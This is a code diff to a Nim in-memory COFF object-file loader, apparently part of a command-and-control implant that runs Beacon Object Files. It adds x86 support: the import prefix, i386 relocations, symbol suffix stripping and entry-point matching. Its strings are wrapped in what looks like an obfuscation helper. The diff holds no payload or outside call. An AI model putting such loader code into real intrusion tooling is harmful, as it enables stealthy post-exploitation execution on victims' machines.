@@ -17,6 +17,11 @@ import ./[beacon, utils]
 ]#
 
 # Type definitions
+when defined(amd64):
+    const IMP_PREFIX = "__imp_"
+else:
+    const IMP_PREFIX = "__imp__"
+
 type
     SECTION_MAP = object
         base: PVOID
@@ -37,8 +42,13 @@ type
 
     POBJECT_CTX = ptr OBJECT_CTX
 
-    # For entry point execution
-    EntryPoint = proc(args: PBYTE, argc: ULONG): void {.stdcall.}
+    EntryPoint = proc(args: PBYTE, argc: ULONG): void {.cdecl.}
+
+proc startsWith(s, prefix: string): bool =
+    if prefix.len > s.len: return false
+    for i in 0 ..< prefix.len:
+        if s[i] != prefix[i]: return false
+    return true
 
 # Macro for page alignment ( important for calculating the total virtual memory required for the object file to be loaded and executed)
 # #define PAGE_ALIGN( x ) (((ULONG_PTR)x) + ((SIZE_OF_PAGE - (((ULONG_PTR)x) & (SIZE_OF_PAGE - 1))) % SIZE_OF_PAGE))
@@ -125,15 +135,16 @@ proc objectResolveSymbol(symbol: var PSTR, stringTable: PCHAR): PVOID =
 
     let fullSymbol = $symbol
 
-    # Check for internal Beacon functions
-    if (fullSymbol.len >= 12 and fullSymbol[0..11] == protect("__imp_Beacon")) or
-       (fullSymbol.len >= 16 and fullSymbol[0..15] == protect("__imp_toWideChar")) or
-       (fullSymbol.len >= 18 and fullSymbol[0..17] == protect("__imp_LoadLibraryA")) or
-       (fullSymbol.len >= 20 and fullSymbol[0..19] == protect("__imp_GetProcAddress")) or
-       (fullSymbol.len >= 22 and fullSymbol[0..21] == protect("__imp_GetModuleHandleA")) or
-       (fullSymbol.len >= 17 and fullSymbol[0..16] == protect("__imp_FreeLibrary")):
+    # Extract function name after import prefix (x64: __imp_, x86: __imp__)
+    var funcName = fullSymbol[IMP_PREFIX.len..^1]
 
-        let funcName = fullSymbol[6..^1]
+    # Check for internal Beacon functions
+    if funcName.startsWith("Beacon") or
+       funcName.startsWith("toWideChar") or
+       funcName.startsWith("LoadLibraryA") or
+       funcName.startsWith("GetProcAddress") or
+       funcName.startsWith("GetModuleHandleA") or
+       funcName.startsWith("FreeLibrary"):
 
         for i in 0 ..< beaconApiAddresses.len():
             if funcName == beaconApiAddresses[i].name:
@@ -142,8 +153,8 @@ proc objectResolveSymbol(symbol: var PSTR, stringTable: PCHAR): PVOID =
 
         raise newException(CatchableError, protect("Failed to resolve internal symbol: ") & funcName)
 
-    # Remove __imp_ prefix for external symbols
-    symbol = cast[PSTR](cast[uint](symbol) + 6)
+    # Remove import prefix for external symbols
+    symbol = cast[PSTR](cast[uint](symbol) + IMP_PREFIX.len)
 
     # External Win32 APIs use the following format: LIBRARY$Function
     zeroMem(addr buffer[0], MAX_PATH)
@@ -156,6 +167,13 @@ proc objectResolveSymbol(symbol: var PSTR, stringTable: PCHAR): PVOID =
 
     library = cast[PSTR](addr buffer[0])
     function = cast[PSTR](cast[uint](pos) + 1)
+
+    # On x86, function could have a @N suffix, which needs to be removed
+    # e.g. __imp__KERNEL32$GetProcessHeap@0
+    when not defined(amd64):
+        var atPos = cast[PSTR](strchr(function, '@'))
+        if atPos != nil:
+            atPos[] = '\0'
 
     # Resolve the library instance
     hModule = GetModuleHandleA(library)
@@ -180,24 +198,32 @@ proc objectResolveSymbol(symbol: var PSTR, stringTable: PCHAR): PVOID =
     - pSecBase: Base address of the section in the newly allocated object file, where the relocation needs to occur
 ]#
 proc objectRelocation(uType: ULONG, pRelocAddress: PVOID, pSecBase: PVOID) =
-    case(uType)
-    of IMAGE_REL_AMD64_ADDR64:
-        cast[PUINT64](pRelocAddress)[] = cast[UINT64](cast[uint](cast[PUINT64](pRelocAddress)[]) + cast[uint](pSecBase))
-    of IMAGE_REL_AMD64_ADDR32NB:
-        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](pSecBase) - (cast[uint](pRelocAddress) + 4))
-    of IMAGE_REL_AMD64_REL32:
-       cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32)
-    of IMAGE_REL_AMD64_REL32_1:
-        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 1)
-    of IMAGE_REL_AMD64_REL32_2:
-        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 2)
-    of IMAGE_REL_AMD64_REL32_3:
-        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 3)
-    of IMAGE_REL_AMD64_REL32_4:
-        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 4)
-    of IMAGE_REL_AMD64_REL32_5:
-        cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 5)
-    else: discard
+    when defined(amd64):
+        case(uType)
+        of IMAGE_REL_AMD64_ADDR64:
+            cast[PUINT64](pRelocAddress)[] = cast[UINT64](cast[uint](cast[PUINT64](pRelocAddress)[]) + cast[uint](pSecBase))
+        of IMAGE_REL_AMD64_ADDR32NB:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](pSecBase) - (cast[uint](pRelocAddress) + 4))
+        of IMAGE_REL_AMD64_REL32:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32)
+        of IMAGE_REL_AMD64_REL32_1:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 1)
+        of IMAGE_REL_AMD64_REL32_2:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 2)
+        of IMAGE_REL_AMD64_REL32_3:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 3)
+        of IMAGE_REL_AMD64_REL32_4:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 4)
+        of IMAGE_REL_AMD64_REL32_5:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32 - 5)
+        else: discard
+    else:
+        case(uType)
+        of IMAGE_REL_I386_DIR32:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase))
+        of IMAGE_REL_I386_REL32:
+            cast[PUINT32](pRelocAddress)[] = cast[UINT32](cast[uint](cast[PUINT32](pRelocAddress)[]) + cast[uint](pSecBase) - cast[uint](pRelocAddress) - sizeof(UINT32).uint32)
+        else: discard
 
 #[
     Section processing
@@ -235,29 +261,38 @@ proc objectProcessSection(objCtx: POBJECT_CTX) =
             reloc = cast[PVOID](cast[uint](secMap[i].base) + uint(objRel.union1.VirtualAddress))
             resolved = nil
 
-            # Check if symbol starts with `__imp_` (imported functions)
-            if symName.len >= 6 and symName[0..5] == "__imp_":
+            # Check if symbol is an imported functions
+            if symName.startsWith(IMP_PREFIX):
                 resolved = objectResolveSymbol(symbol, stringTable)
 
-            # Perform relocation on the imported function
-            if (objRel.Type == IMAGE_REL_AMD64_REL32 or
-                objRel.Type == IMAGE_REL_AMD64_REL32_1 or
-                objRel.Type == IMAGE_REL_AMD64_REL32_2 or
-                objRel.Type == IMAGE_REL_AMD64_REL32_3 or
-                objRel.Type == IMAGE_REL_AMD64_REL32_4 or
-                objRel.Type == IMAGE_REL_AMD64_REL32_5) and (resolved != nil):
-                symMap[fnIndex] = resolved
+                # Perform relocation on the imported function
+                when defined(amd64):
+                    if (objRel.Type == IMAGE_REL_AMD64_REL32 or
+                        objRel.Type == IMAGE_REL_AMD64_REL32_1 or
+                        objRel.Type == IMAGE_REL_AMD64_REL32_2 or
+                        objRel.Type == IMAGE_REL_AMD64_REL32_3 or
+                        objRel.Type == IMAGE_REL_AMD64_REL32_4 or
+                        objRel.Type == IMAGE_REL_AMD64_REL32_5) and (resolved != nil):
+                        symMap[fnIndex] = resolved
 
-                let adjustment = case objRel.Type
-                    of IMAGE_REL_AMD64_REL32_1: 1
-                    of IMAGE_REL_AMD64_REL32_2: 2
-                    of IMAGE_REL_AMD64_REL32_3: 3
-                    of IMAGE_REL_AMD64_REL32_4: 4
-                    of IMAGE_REL_AMD64_REL32_5: 5
-                    else: 0
+                        let adjustment = case objRel.Type
+                            of IMAGE_REL_AMD64_REL32_1: 1
+                            of IMAGE_REL_AMD64_REL32_2: 2
+                            of IMAGE_REL_AMD64_REL32_3: 3
+                            of IMAGE_REL_AMD64_REL32_4: 4
+                            of IMAGE_REL_AMD64_REL32_5: 5
+                            else: 0
 
-                cast[PUINT32](reloc)[] = cast[UINT32]((cast[uint](objCtx.symMap) + uint(fnIndex) * uint(sizeof(PVOID))) - cast[uint](reloc) - uint(sizeof(uint32)) - uint(adjustment))
-                inc fnIndex
+                        cast[PUINT32](reloc)[] = cast[UINT32]((cast[uint](objCtx.symMap) + uint(fnIndex) * uint(sizeof(PVOID))) - cast[uint](reloc) - uint(sizeof(uint32)) - uint(adjustment))
+                        inc fnIndex
+                else:
+                    if resolved != nil:
+                        symMap[fnIndex] = resolved
+                        if objRel.Type == IMAGE_REL_I386_DIR32:
+                            cast[PUINT32](reloc)[] = cast[UINT32](cast[uint](objCtx.symMap) + uint(fnIndex) * uint(sizeof(PVOID)))
+                        elif objRel.Type == IMAGE_REL_I386_REL32:
+                            cast[PUINT32](reloc)[] = cast[UINT32]((cast[uint](objCtx.symMap) + uint(fnIndex) * uint(sizeof(PVOID))) - cast[uint](reloc) - uint(sizeof(uint32)))
+                        inc fnIndex
             else:
                 secBase = secMap[objSym.SectionNumber - 1].base
 
@@ -292,7 +327,12 @@ proc objectExecute(objCtx: POBJECT_CTX, entry: PSTR, args: PBYTE, argsLen: DWORD
         let symName = getSymbolName(objSym, stringTable)
 
         # Check if the function is defined within the object file
-        if ISFCN(objSym.Type) and (symName == $entry):
+        # On x86, symbols, including the "go" entry point, have a leading underscore, which has to be removed
+        when defined(amd64):
+            let entryMatch = symName == $entry
+        else:
+            let entryMatch = symName == "_" & $entry
+        if ISFCN(objSym.Type) and entryMatch:
             secBase = secMap[objSym.SectionNumber - 1].base
             secSize = secMap[objSym.SectionNumber - 1].size
 
@@ -336,14 +376,14 @@ proc inlineExecute*(objectFile: PBYTE, objectFileLen: DWORD, args: PBYTE = nil, 
     objCtx.symTbl       = cast[PIMAGE_SYMBOL](cast[uint](objectFile) + cast[uint](objCtx.union.header.PointerToSymbolTable))
     objCtx.sections     = cast[PIMAGE_SECTION_HEADER](cast[uint](objectFile) + uint(sizeof(IMAGE_FILE_HEADER)))
 
-    # Verifying that the object file's architecture is x64
     when defined(amd64):
         if objCtx.union.header.Machine != IMAGE_FILE_MACHINE_AMD64:
             RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
-            raise newException(CatchableError, protect("Only x64 object files are supported."))
+            raise newException(CatchableError, protect("Only x64 object files supported."))
     else:
-        RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
-        raise newException(CatchableError, protect("Only x64 object files are supported."))
+        if objCtx.union.header.Machine != IMAGE_FILE_MACHINE_I386:
+            RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
+            raise newException(CatchableError, protect("Only x86 object files supported."))
 
     # Calculate required virtual memory
     virtSize = objectVirtualSize(addr objCtx)
